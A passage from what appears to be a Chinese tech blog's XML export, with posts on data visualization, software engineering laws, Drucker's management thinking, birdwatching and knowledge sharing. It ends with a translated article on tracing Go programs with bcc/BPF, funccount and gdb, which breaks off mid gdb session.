    <content type="text"><![CDATA[摘要 《The Data Visualization Master | 数据可视化专家》 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测数据可视化（三）基于 Graphviz 实现程序化绘图 OmniGraffle 和 Graphviz Why draw when you can code? Graphviz 简介 最佳 Graphviz 实践(一)：流程图、数据结构图、网络路径 Trace Route 最佳 Graphviz 实践(二)：复杂社会关系链分析（《红楼梦》、《权力的游戏》） 最佳 Graphviz 实践(三)：机器学习算法-决策树(Decision Tree) 数据可视化（四）开源地理信息技术简史（Geographic Information System 开源 GIS 技术简史 1.1、GIS 的起源: MOSS and GRASS 1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer 1.3、创新和教育：开源项目驱动 1.4、开源 GIS 的商业支持 Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution 数据可视化（五）基于网络爬虫制作可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 仪表盘（DashBoard） 决策路径 (Decision Path) ELK Stack（Elasticsearch、Logtash、Kibana） Graphite &amp; Grafana Keen IO 、Librato、DataDog 数据可视化（七）Graphite 体系结构详解 1.指标采集器 - Dropwizard Metrics, StatsD 2.监听器 - Carbon, graphite-ng, Riemann 3.存储数据库 – Whisper, InfluxDB, Cyanite 数据可视化（十）公共数据源列表 教学数据源 政府公开数据库列表 扩展阅读：《The Data Visualization Master | 数据可视化专家》案例 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 Science Modern data visualization and analytics for life sciences 参考文献 Nature：数据可视化可提高科研成果的可重复性 | 2018-03-05 生命奥秘 生物探索 邱俊涛：一张漂亮的可视化图表背后 NASA中文：一个新的蓝色星球 Nature :告别信息混乱，如何制作清晰的通路图？ 《纽约时报》的“爷爷级”数据可视化|2017-09-27 新京报传媒研究]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road To Leader：软件工程实践中的十大法则]]></title>
    <url>%2F2017%2F07%2F05%2FLaw-Of-Engineering%2F</url>
    <content type="text"><![CDATA[摘要 0.1 Moore’s Law 0.2 Metcalfe’s Law 1、Little’s Law 2、Goodhart’s Law 3、Conway’s Law 4、Parkinson’s Law 5、Humphrey’s Law 6、Law of the instrument 7、Law of Demeter 8、Dude’s Law 9、Law of 2 Feet 10、Law of Propinquity 11、Linus’ Law 0.1 Moore’s Law摩尔定律,由英特尔创始人之一戈登·摩尔提出来的。其内容为：积体电路上可容纳的电晶体（晶体管）数目，约每隔两年便会增加一倍。主要有以下三种演绎版本： 集成电路芯片上所集成的电路的数目，每隔18个月就翻一倍。 微处理器的性能每隔18个月提高一倍，或价格下降一半。 用一个美元所能买到的电脑性能，每隔18个月翻两倍。 这个定律 被引用最多，分歧很大，反对声音也最多，有预测认为摩尔定律的极限将在2025年左右到来，但也有更乐观的预测认为还能持续更久。 0.2 Metcalfe’s Law梅特卡夫定律，由乔治·吉尔德于1993年提出，但以计算机网络先驱、3Com公司的创始人罗伯特·梅特卡夫的姓氏命名。内容是：一个网络的价值等于该网络内的节点数的平方，而且该网络的价值与联网的用户数的平方成正比。该定律指出，一个网络的用户数目越多，那么整个网络和该网络内的每台电脑的价值也就越大。 1. Little’s LawCycle Time = Work in Progress / Throughput 中译为利特尔法则，由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 the relationship between the average number of customers in a store, their arrival rate, and the average time in the store. 应用领域：精益生产、系统运筹方面应用广泛，Kanban(看板)方法论的基石。 It is the basis of Kanban. The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions. 2. Goodhart’s Law When a measure becomes a target, it ceases to be a good measure.当一个政策变成目标，它将不再是一个好的政策。 古德哈特定律（Goodhart’s law），是以Charles Goodhart的名字命名，他在1975年的文章中首次发表（当时作为英格兰银行的政策建议）：当政府试图管理这些金融财产的特别标识时，它们便不再是可信的经济风向标。应用领域：公共管理，敏捷开发，目标管理 了解一个指标有意义与否的一个好的方法是试着去理解其所体现的个人价值。关注那些可以给出好的建议、体现沟通技能和良好态度，尤其是需要巨大的付出才能作弊的指标。 程序员日志：是什么导致优秀的程序员写出如此垃圾的代码？ blogospheroid:The Importance of Goodhart’s Law 3. Conway’s LawAny organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致 – Melvyn Conway, 1967 《人月神话》：Adding manpower to a late software project makes it later –Fred Brooks, (1975) 为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。应用领域：Micro-Service 微服务 4. Parkinson’s Law Work expands so as to fill the time available for its completion.在工作能够完成的时限内，工作量会一直增加，直到所有可用时间都被填充为止 帕金森定理（英语：Parkinson’s law），由英国作家西里尔·诺斯古德·帕金森提出，语最早出现在1955年《经济学人》中的幽默短文。在他后续的书中进一步阐述（《Parkinson’s Law: The Pursuit of Progress》）。官僚组织随着时间而扩大的速率。一个官僚组织(作者注：包括非政府组织)中的雇员总数，通常以每年5-7%的速度增加。他认为，有两股力量造成了这个增长：(1) 一个官员希望他的下属增加，但不希望解雇造成敌人增加；以及(2) 官员会制造工作给彼此。 同意！ 5. Humphrey’s Law The user will never know what they want until after the system is in production (maybe not even then)用户将永远不知道他们想要什么，直到系统已经上线。（也许上线了也不知道） “服务员，给我来份宫保鸡丁！”“好嘞！”————这叫原始需求大厨做到一半。“服务员，菜里不要放肉。”“不放肉怎么做啊？”“不放肉就行了，其它按正常程序做，不就行了，难吗？”“好的您稍等”————中途需求变更大厨：”你大爷，我肉都回锅了”服务员：”顾客非要要求的嘛，你把肉挑出来不就行了吗”大厨：”行你大爷” 然而还是一点点挑出来了————改动太大，部分重构。。。。。。“服务员，这样吧，腐竹不要了，换成蒜毫能快点吗？对了，顺便加点番茄酱”————因工期过长再次改动需求大厨：”我日了狗啊，你TM不知道蒜毫也得焯水啊？还有你让我怎么往热菜里放番茄酱啊？？”服务员：”焯水也比等腐竹强吧，番茄酱往里一倒不就行了吗？很难吗？”大厨：”腐竹我还得接着泡，万一这孙子一会又想要了呢。”————频繁改动开始导致大量冗余 冷兔笑话：码农做项目与点菜类比的笑话 John Eaton:The Three Laws of Software Development - Humphrey’s Law 6. Law of the instrument If all you have is a hammer, everything looks like a nail 工具定律，锤子定律或马斯洛的锤子。表现为对一个熟悉的工具过度的依赖，“如果你有的只是一个锤子，那么所有的东西看起来都像一个钉子”以及一些由此转化的说法，来自于亚伯拉罕·马斯洛1966年发行的《科学的心理学》一书。例如： “XXX是世界上最好的语言，没有之一” “加强party的领导” Youtube:Law of the instrument 7. Law of Demeter Law of Demeter is also called “Principle of Least Knowledge” 得墨忒耳定律（Law of Demeter，缩写LoD）是一种软件开发的设计指导原则，特别是面向对象的程序设计。美国东北大学在1987年末发明，名称来源于希腊神话中的农业女神，孤独的得墨忒耳。简单描述为: 每个单元对于其他的单元只能拥有有限的知识：只是与当前单元紧密联系的单元； 每个单元只能和它的朋友交谈：不能和陌生单元交谈； 只和自己直接的朋友交谈。 a.b.Method()违反了此定律，而a.Method()不违反此定律。一个简单例子是，人可以命令一条狗行走（walk），但是不应该直接指挥狗的腿行走，应该由狗去指挥控制它的腿如何行走。 Dan Manges:Misunderstanding the Law of Demeter 8. Dude’s LawValue (of a project) = Why over How [or Value = Why / How] “David [the law’s creator] comes from the music industry. New musicians focus on having a nice sound. Professional musicians first think about the mood of the song, the emotion they want to bring across and then work out the sound that fits it” 该法则的发明者来自音乐产业。新手音乐家注重好听的声音。专业的音乐家首先考虑歌曲的情绪，他们想要传达的情感，然后找出适合它的声音。应用领域：项目管理、目标管理 Dude’s Law, Don Reinertsen and Walmart How does a former musician build a successful business in the agile space? DevJam leads the way with David Hussman 9. Law of 2 Feet If at any time during our time together you find yourself in any situation where you are neither learning nor contributing, use your two feet, go someplace else. 应用领域：组织沟通 Youtube:Online Open Space Technology Meetings Open Space Technology What Is Open Space Technology? 10. Law of Propinquity The probability of two people communicating is inversely proportional to the distance between them.两个人交流的概率与他们之间的距离成反比。数字时代亦然。 Cucumbers get more pickled than brine gets cucumbered.当你进入一个环境，它会更多地影响你而不是相反 the more we see people and interact with them, the more probable we are to like them. Twitter and the law of propinquity Bonus: Prescott’s Pickle Principle 11. Linus’ Law以Linux创始人林纳斯·托瓦兹（Linus Torvalds）的名字来命名，但最先由埃里克·斯蒂芬·雷蒙（Eric S. Raymond）的作品《大教堂和市集》（The Cathedral and the Bazaar）中所提出。“足够多的眼睛，就可让所有问题浮现”（given enough eyeballs, all bugs are shallow）。 应用领域：代码审查。“只要有足够的单元测试员及共同开发者，所有问题都会在很短时间内被发现，而且能够很容易被解决”。将代码展示给更多开发者以达成共识。在2001年出版的《黑客伦理与信息时代的精神》(The Hacker Ethic And the Spirit of th Information Age)里，林纳斯在其为此书做的序言中，自己定义了另外一个林纳斯定律 人类所有的动机可分为递进的三种类型 — 生存（survival）、社会生活（social life）、娱乐（entertainment）。…… “黑客”是已经超越利用计算机谋生存而进入后面两个阶段的人。计算机本身就是娱乐。黑客坚信没有比这更高的动力阶段。 扩展阅读 Linus Torvalds:Just for Fun Linus Torvalds: The mind behind Linux 参考文献 Mental models | Dec 22, 2016]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读者反馈问题汇编]]></title>
    <url>%2F2017%2F07%2F05%2FTechnology-Writing-Reader-Question%2F</url>
    <content type="text"><![CDATA[摘要 About Methodology1.jianshu.com@FallownDown我觉得您说的很有道理，我也想通过看原版书来学英语，可是看得超慢，而且我的英语语法也不是很好，碰到长难句就搞不懂啥意思了，去网上搜翻译感觉翻译的很生硬，这个问题您有什么好的建议吗？ 20170630 Re:那就换一本。原版书也是有层次区分的，初试者可以从易到难，比如各种手册、Packet Guide，语法简明，不会有长难句。另外，很多内容看不懂很可能是相关领域的基础知识没掌握，不妨再看看别的。总之，无论学什么都要循序渐进。20170703 About Perf 公众号读者（鱼露）From 《基于Linux单机的负载评估》：关于应用程序优化io算法可否再出一篇？ About OpenSourcePacket Capturing 关于网络数据包的捕获与分析:想学习学习pfring Ntopng jianshu.com@五的四分之三:sflow 这块什么时候能出来啊，比较期待，最好是接受指定端口发送来的sflow数据进行分析。20170512 jianshu.com@梁家公子哥儿:期待多点探测部署相关的一些的介绍 20170503 jianshu.com@todayzhou:博主好，请教一个问题。最近领导让装一个ntopng看下里面的具体的功能是否适合当前的网络环境，我按照其他的教程安装好了，然后在交换机上直接端口镜像把流量丢给ntopng服务器，基本的功能里都有数据显示了，但是local http service和matrix以及流量矩阵那些都显示不出来数据，这是因为流量获取的方式不对，还是我缺装了什么东西呢。 Ganglia jianshu.com@隔壁_老吴 ：多播如何跨网段？因为单播需要在服务器端添加所有agent IP，上百台不现实 20170705 Kafka jianshu.com@清新空气:很赞。请问，您实践kafka用在哪个业务领域？ Redmine jianshu.com@yuedingwangji:所以这东西到底是干嘛的？]]></content>
      <tags>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road To Leader:管理哲学]]></title>
    <url>%2F2017%2F07%2F02%2FManager%2F</url>
    <content type="text"><![CDATA[摘要 彼得·德鲁克论管理哲学 彼得·德鲁克论管理哲学 知识必须要不断地改进、质疑和增加，否则它就会消失 每隔3～4年，我都会挑选一个新的学科。可能是日本艺术，也可能是经济学。3年的学习并不足以掌握一个学科的专业知识，但至少能够对它有一个基本的了解。因此，在六十多年的时间里，我一直在坚持不断地系统学习，从一个学科到另一个学科。这不仅让我获得了丰厚的知识储备，也迫使我以开放的眼界面对新的科目、新的路径和新的方法，因为每一个学科都有着不同的假设和不同的方法论。 机构是由一群专业人士组成的。举个例子，某个乐队成员至少都应该了解音乐，要知道作曲家的作品是什么样的，而不仅仅是只知道一个巴松管。你必须要有整体责任意识，要将自己置于一个更大画面中。命令是自上而下的，信息则是自下而上的。（不列颠百科全书奖的获奖致辞，1987） 应用到工作中的知识才是知识工作学界普遍认为知识就是你在学校课堂里学到的东西，但事实并非如此。我们在课堂上获得的是信息，我们希望你具有学习的能力。我们在书本中学到的是学问，而只有你将这种学问应用到工作中时，它才会转变为知识。 如果你的行动会导致外部发生变化，而你自身却未发生任何变化，那么这表明你并没有真正地学到什么。而如果只有你自身发生了变化，那么这表明你并没有真正地运用知识。因此，问题就在于：我们该如何对待那些学有所成的、掌握信息的人？我们又该如何让他们变得高效呢？首先要指出的是，提高计时工人工作效率的方式并不适用于他们。首要一点，如果他们是优秀的人才，那么他们对自己所从事工作的了解程度将远超过老板。其次，教育给予了人们自信心，使之具备了流动能力，从而为个人发展提供了更大的舞台。 我至今仍听到商界的一些朋友谈论忠诚度之类的话题。不要再谈了。接受这样一个现实，那就是你必须要为雇员提供有价值的工作。获取薪水是工作的目的之一，但却非唯一目的。 信息化组织必须是一个开创型组织你该如何去组织呢？事实上，你必须要有一个学科作为基础，同时，你还要了解其他与之相关的外部学科。一个学科是必须的容器，但它只是暂时性的，非常短暂。那么，你该如何去做呢？现在，很多公司已经发现，你 需要的并不是一个精于某一领域的研究负责人，你需要的是一个了解其他诸多领域的技术专家。 你必须要从知识本身是不断变化的这一假定触发————你掌握的知识越多，它的变化就越多。有假定认为，知识本身是一种输入，它必须经过整合才能成为输出。有假定认为知识必须是集中的。如果你将它愤慨，那么你只会得到很少。你得到的是新闻，而不是知识。 变革对你我的意义未来的管理人员一定要打好见识的基础。坦白地讲，我觉得我们现在做得还不够。在我们的高管培训计划中，我发现很多人在基础知识方面都很薄弱。原因有二：一是以为你太过于专业化了。在我们这个国家，大多数人走的是技术路线，也就是说，他们的升迁是靠自己的专业，除非他们做到公司的高层，否则他们不会参与公司的其他业务或管理。就个人而言，这或许是一种优势，但最终他是要付出代价的。 一个人需要最新的知识，但他也需要最基础的知识。对于基础知识，我们从未给予足够重视，我们对它采取了想当然的态度，这显然是错误的。我们要提醒自己，同时也要提醒他人，不管一个神经外科医生的医术有多么高超，他都是从人体解剖学开始学起的。 管理是一种自由艺术在大多数商学院中，管理仍是被作为技巧讲授的，比如说如何做预算，如何促进组织发展。诚然，同其他工作一样，管理也有其自身的工具和技巧，但正如医学的精髓并不是进行尿样分析一样，管理的精髓也不是技巧或程序。管理的精髓是让知识发挥生产性作用。换句话说，管理是一种社会功能。而作为实践，管理是一种真正的自由艺术。 参考文献]]></content>
      <tags>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BirdWatching:广州湿地公园观鸟]]></title>
    <url>%2F2017%2F07%2F02%2FBirdWatching-GZ-Wetland%2F</url>
    <content type="text"><![CDATA[摘要 广州华南植物园 广州南沙湿地公园 广州海珠湿地公园 广州华南植物园时间：20171014 14:00 ~ 18:00器材：SONY ILCE-6000L镜头：55-210mm F/4.5-6.3 效果不佳 广州南沙湿地公园时间：20170923 15:00 ~ 19:00器材：SONY ILCE-6000L镜头：55-210mm F/4.5-6.3 good： 云台 望远镜 红外遥控器 不足： 时间点：10月份大部分是留鸟·白鹭，候鸟集中季节为春节前夕 交通不便 园内无照明 广州海珠湿地公园时间：20170701 13:00 ~ 16:00器材：SONY ILCE-6000L镜头：55-210mm F/4.5-6.3 good： 挡雨盖（很重要） bad: 未携带望远镜 未携带雨具 鞋子不挡水 上衣非速干 参考文献 初秋打鸟秘笈 教你如何拍出完美飞鸟]]></content>
      <tags>
        <tag>摄影</tag>
        <tag>Sport</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Spark]]></title>
    <url>%2F2017%2F06%2F30%2FOpenSource-Spark%2F</url>
    <content type="text"><![CDATA[摘要待编辑 参考文献 Spark on Angel：Spark机器学习的核心加速器 张逸：对微服务的简单思考 张逸：Spark的现状和未来发展,201411Spark提供的基于RDD的一体化解决方案，将MapReduce、Streaming、SQL、Machine Learning、Graph Processing等模型统一到一个平台下，并以一致的API公开，并提供相同的部署方案，使得Spark的工程应用领域变得更加广泛。 张逸：快速了解Scala技术栈 张逸：理解Spark的核心RDD 张逸：Spark的硬件配置 张逸：剖析大数据平台的数据采集 Spark编程指南(Python版) | Cholerae Spark存储机制分析 | Cholerae 解决Spark数据倾斜（Data Skew）的N种姿势]]></content>
      <tags>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road To Leader：构建知识共享型团队]]></title>
    <url>%2F2017%2F06%2F27%2FTeamWork-Knowledge-Sharing%2F</url>
    <content type="text"><![CDATA[摘要 一些有趣的知识分享圈子 推荐一些有趣的的电子书 知识分享圈子 知识星球|睿哥读书会（年费制） 知识星球|系统运维专家（免费加入） 知识星球|Machine Learning 小组（免费加入） 知识星球|经济学人翻译社（免费加入） 我的电子书列表 《The Linux Perf Master| 操作系统性能专家》 《The Cyber-Security Master | 网络安全专家》 《The Data Visualization Master | 数据可视化专家》 《The Machine Learning Master | 机器学习专家》 TipsCoffeeDeveloper | 你为什么不分享多写，是有讲究的。特别是对于技术类的文章来说，为什么？因为技术文章是有套路或者说模板可循的。例如：介绍一个新技术 介绍技术名称和大概作用 抛出一个常见的问题 以往的技术是如何解决的 新技术是如何解决的 新技术在解决方案上对比旧技术的优势 新技术存在的问题与不足 展望新技术的发展和提出更多的应用场景 有条件的还可以提供性能测试结果等等，加强说服力 参考文献 热爱阅读的芬兰人 赵亚:我为什么坚持这么多年写博客 Joey Chen:我为什么鼓励工程师写Blog 邱俊涛：技术人员如何写一本书]]></content>
      <tags>
        <tag>最佳工程实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪]]></title>
    <url>%2F2017%2F06%2F27%2FDTrace_bcc%2F</url>
    <content type="text"><![CDATA[摘要 原文：Brendan Gregg’s Blog :《Golang bcc/BPF Function Tracing》，31 Jan 2017 引子：gdb、go execution tracer、GODEBUG、gctrace、schedtrace 一、gccgo Function Counting 二、Go gc Function Counting 三、Per-event invocations of a function 四、Interface Arguments 五、Function Latency 六、总结 七、Tips：构建 LLVM 和 Clang 开发工具库 在这篇文章中，我将迅速调研一种跟踪的 Go 程序的新方法：基于 Linux 4.x eBPF 实现动态跟踪。如果你去搜索 Go 和 BPF，你会发现使用 BPF 接口的 Go 语言接口（例如，gobpf）。这不是我所探索的东西：我将使用 BPF 工具实现 Go 应用程序的性能分析和调试。 目前已经有多种调试和追踪 Go 程序的方法，包括但不限于： gdb go execution tracer ：用于高层异常和阻塞事件 Go execution tracer. (import “runtime/trace”)The tracer captures a wide range of execution events like goroutine creation/blocking/unblocking, syscall enter/exit/block, GC-related events, changes of heap size, processor start/stop, etc and writes them to an io.Writer in a compact form. A precise nanosecond-precision timestamp and a stack trace is captured for most events. A trace can be analyzed later with ‘go tool trace’ command. GODEBUG （一个跨平台的Go程序调试工具）、 gctrace 和 schedtrace BPF 追踪以做很多事，但都有自己的优点和缺点，接下来将详细说明。首先我从一个简单的 Go 程序开始（ hello.go） 1234567package mainimport "fmt"func main() &#123; fmt.Println("Hello, BPF!")&#125; 一、gccgo Function Counting我开始会使用 gccgo 编译，然后使用 Go gc 编译器 。（区别：gccgo 可以生成优化后的二进制文件，但是基于老版本的 Go。） 1234## 编译$ gccgo -o hello hello.go$ ./helloHello, BPF! 现在我将使用 bcc 工具的 funccount 来动态跟踪和计数所有以 “fmt.” 开头的 Go 库函数调用，在另一个终端重新运行 Hello 程序效果如下： 123456789101112131415161718192021# funccount 'go:fmt.*'Tracing 160 functions for "go:fmt.*"... Hit Ctrl-C to end.^CFUNC COUNTfmt..import 1fmt.padString.pN7_fmt.fmt 1fmt.fmt_s.pN7_fmt.fmt 1fmt.WriteString.pN10_fmt.buffer 1fmt.free.pN6_fmt.pp 1fmt.fmtString.pN6_fmt.pp 1fmt.doPrint.pN6_fmt.pp 1fmt.init.pN7_fmt.fmt 1fmt.printArg.pN6_fmt.pp 1fmt.WriteByte.pN10_fmt.buffer 1fmt.Println 1fmt.truncate.pN7_fmt.fmt 1fmt.Fprintln 1fmt.$nested1 1fmt.newPrinter 1fmt.clearflags.pN7_fmt.fmt 2Detaching... Neat! 输出结果中包含该程序的 fmt.Println() 函数调用。 我不需要进入任何特殊的模式才能实现这个效果，对于一个已经在运行的 Go 应用我可以直接开始测量而不需要重启进程。 So how does it even work? 这要归功于 uprobes ，Linux 3.5 新增的特性，详见Linux uprobes: User-Level Dynamic Tracing 。 It overwrites instructions with a soft interrupt to kernel instrumentation, and reverses the process when tracing has ended. gccgo 编译的输出提供一个标准的符号表用于函数查找。在这种情况下，我利用 libgo 当测量工具（假定“lib”在“go:”之前），作为 gccgo 发出的一个二进制动态链接库（libgo 包含 fmt 包）。uprobes 可以连接到已经运行的进程，或者像我现在一样作为一个二进制库，捕捉所有调用自己的进程。 为了提高效率，我在内核上下文中进行函数调用计数，只将计数发送到用户空间。例如： 1234567891011121314151617$ file hellohello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4dc45f1eb023f44ddb32c15bbe0fb4f933e61815, not stripped$ ls -lh hello-rwxr-xr-x 1 bgregg root 29K Jan 12 21:18 hello$ ldd hello linux-vdso.so.1 =&gt; (0x00007ffc4cb1a000) libgo.so.9 =&gt; /usr/lib/x86_64-linux-gnu/libgo.so.9 (0x00007f25f2407000) libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f25f21f1000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f25f1e27000) /lib64/ld-linux-x86-64.so.2 (0x0000560b44960000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f25f1c0a000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f25f1901000)$ objdump -tT /usr/lib/x86_64-linux-gnu/libgo.so.9 | grep fmt.Println0000000001221070 g O .data.rel.ro 0000000000000008 fmt.Println$descriptor0000000000978090 g F .text 0000000000000075 fmt.Println0000000001221070 g DO .data.rel.ro 0000000000000008 Base fmt.Println$descriptor0000000000978090 g DF .text 0000000000000075 Base fmt.Println 这些内容看起来非常像一个编译过的 C 语言二进制程序，因此可以使用包括 bcc/BPF在内的许多现有的调试工具和追踪器观测。相对于测量即时编译的运行时要简单得多（例如 Java 和 Node.js）。到目前为止，这个例子唯一的麻烦事函数名称中可能包含非标准的字符，例如“.”。 funccount also has options like -p to match a PID, and -i to emit output every interval. It currently can only handle up to 1000 probes at a time, so “fmt.*“ was ok, but matching everything in libgo: funccount 提供 -p 选项来匹配进程号（PID），-i 选项来控制输出频率。它目前能够同时处理 1000 个探测点，匹配 “fmt.*” 时运行正常，但是匹配 libgo 的所有函数就出现异常。诸如此类的问题在 bcc/BPF 中还有不少，我们需要寻找其它的方法来处理。 12# funccount 'go:*'maximum of 1000 probes allowed, attempted 21178 二、Go gc Function Counting使用 Go 语言的 gc 编译器实现 fmt 函数调用计数： 123$ go build hello.go$ ./helloHello, BPF! 123456789101112131415161718# funccount '/home/bgregg/hello:fmt.*'Tracing 78 functions for "/home/bgregg/hello:fmt.*"... Hit Ctrl-C to end.^CFUNC COUNTfmt.init.1 1fmt.(*fmt).padString 1fmt.(*fmt).truncate 1fmt.(*fmt).fmt_s 1fmt.newPrinter 1fmt.(*pp).free 1fmt.Fprintln 1fmt.Println 1fmt.(*pp).fmtString 1fmt.(*pp).printArg 1fmt.(*pp).doPrint 1fmt.glob.func1 1fmt.init 1Detaching... 你依然能够追踪到 fmt.Println() ，这个二进制程序与 libgo 有所不同：包含该函数的是一个 2M 的静态库（而非动态库的 29K ）。另一个区别就是函数名称包含更多特殊字符，例如 “*“, “(“,等等，我怀疑如果不能修正处理的haul将影响其它调试器（例如 bcc 追踪器）。 12345678$ file hellohello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped$ ls -lh hello-rwxr-xr-x 1 bgregg root 2.2M Jan 12 05:16 hello$ ldd hello not a dynamic executable$ objdump -t hello | grep fmt.Println000000000045a680 g F .text 00000000000000e0 fmt.Println 三、Per-event invocations of a function3.1 gccgo Function Tracing现在我将尝试使用 Sasha Goldshtein 的追踪工具，也是基于 bcc，用来查看每一个函数调用事件。我将回到 gccgo，使用一个非常简单的示例程序（ from the go tour ），functions.go: 1234567891011package mainimport "fmt"func add(x int, y int) int &#123; return x + y&#125;func main() &#123; fmt.Println(add(42, 13))&#125; 追踪 add() 函数。所有参数都输出在右侧，trace 还有其他选项（帮助 -h ），例如输出时间戳和堆栈。 123456789\# trace '/home/bgregg/functions:main.add'PID TID COMM FUNC 14424 14424 functions main.add #... and with both its arguments:\# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'PID TID COMM FUNC -14390 14390 functions main.add 42 13 3.2 Go gc Function Tracing同样的程序，如果使用 go build 就没有 main.add() ? 禁用代码嵌入（ Disabling inlining）即可。 1234567$ go build functions.go# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'could not determine address of symbol main.add$ objdump -t functions | grep main.add$ 1234567$ go build -gcflags '-l' functions.go$ objdump -t functions | grep main.add0000000000401000 g F .text 0000000000000020 main.add# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'PID TID COMM FUNC -16061 16061 functions main.add 536912504 16 That’s wrong. 参数应该是 42 和 13 而不是 536912504 和 16。使用 gdb 查看结果如下： 12345678910111213141516171819202122232425262728293031323334353637383940$ gdb ./functions[...]warning: File "/usr/share/go-1.6/src/runtime/runtime-gdb.py" auto-loading has been declined by your 'auto-load safe-path' set to "$debugdir:$datadir/auto-load".[...](gdb) b main.addBreakpoint 1 at 0x401000: file /home/bgregg/functions.go, line 6.(gdb) rStarting program: /home/bgregg/functions[New LWP 16082][New LWP 16083][New LWP 16084]Thread 1 "functions" hit Breakpoint 1, main.add (x=42, y=13, ~r2=4300314240) at /home/bgregg/functions.go:66 return x + y(gdb) i rrax 0xc820000180 859530330496rbx 0x584ea0 5787296rcx 0xc820000180 859530330496rdx 0xc82005a048 859530698824rsi 0x10 16rdi 0xc82000a2a0 859530371744rbp 0x0 0x0rsp 0xc82003fed0 0xc82003fed0r8 0x41 65r9 0x41 65r10 0x4d8ba0 5082016r11 0x0 0r12 0x10 16r13 0x52a3c4 5415876r14 0xa 10r15 0x8 8rip 0x401000 0x401000eflags 0x206 [ PF IF ]cs 0xe033 57395ss 0xe02b 57387ds 0x0 0es 0x0 0fs 0x0 0gs 0x0 0 启动信息中包含一个关于 runtime-gdb.py 的警告，它非常有用：如果需要进一步深入挖掘 Go 上下文，我希望能够修复并找出告警原因。即使没有该信息，gdb 依然可以输出参数变量的值是 “x=42, y=13”。我也将它们从寄存器导出与 x86_64 ABI（Application Binary Interface，应用程序二进制接口）对比，which is how bcc’s trace reads them. From the syscall(2) man page: 1234 arch/ABI arg1 arg2 arg3 arg4 arg5 arg6 arg7 Notes ──────────────────────────────────────────────────────────────────[...] x86_64 rdi rsi rdx r10 r8 r9 - The reason is that Go’s gc compiler is not following the standard AMD64 ABI function calling convention, which causes problems with this and other debuggers. 42 和 13 没有出现在 rdi , rsi 或者其它任何一个寄存器。原因是 Go 的 gc 编译器不遵循标准的 AMD64 ABI 函数调用约定，其它调试器也会存在这个问题。这很烦人。我猜 Go 语言的返回值使用的是另外一种 ABI，因为它可以返回多个值，所以即使入口参数是标准的，我们仍然会遇到差异。我浏览了指南（Quick Guide to Go’s Assembler and the Plan 9 assembly manual），看起来函数在堆栈上传递。这些是我们的 42 和 13： 123(gdb) x/3dg $rsp0xc82003fed0: 4198477 420xc82003fee0: 13 BPF can dig these out too. As a proof of concept, I just hacked in a couple of new aliases, “go1” and “go2” for those entry arguments: BPF 也可以挖掘这些信息。为了验证这一个概念，我为入口参数声明一对新的别名“go1”和“go2” 。希望您阅读本文的时候，我（或者其他人）已经将它加入到 bcc 追踪工具中，最好是 “goarg1”, “goarg2”, 等等。 123# trace '/home/bgregg/functions:main.add "%d %d" go1, go2'PID TID COMM FUNC -17555 17555 functions main.add 42 13 四、Interface Arguments你可以写一个自定义的 bcc/BPF 程序来挖掘，为了处理接口参数我们可以给 bcc 的跟踪程序添加多个别名。输入参数是接口的示例： 12func Println(a ...interface&#123;&#125;) (n int, err error) &#123; return Fprintln(os.Stdout, a...) 123456789101112131415161718192021$ gdb ./hello[...](gdb) b fmt.PrintlnBreakpoint 1 at 0x401c50(gdb) rStarting program: /home/bgregg/hello[Thread debugging using libthread_db enabled]Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".[New Thread 0x7ffff449c700 (LWP 16836)][New Thread 0x7ffff3098700 (LWP 16837)][Switching to Thread 0x7ffff3098700 (LWP 16837)]Thread 3 "hello" hit Breakpoint 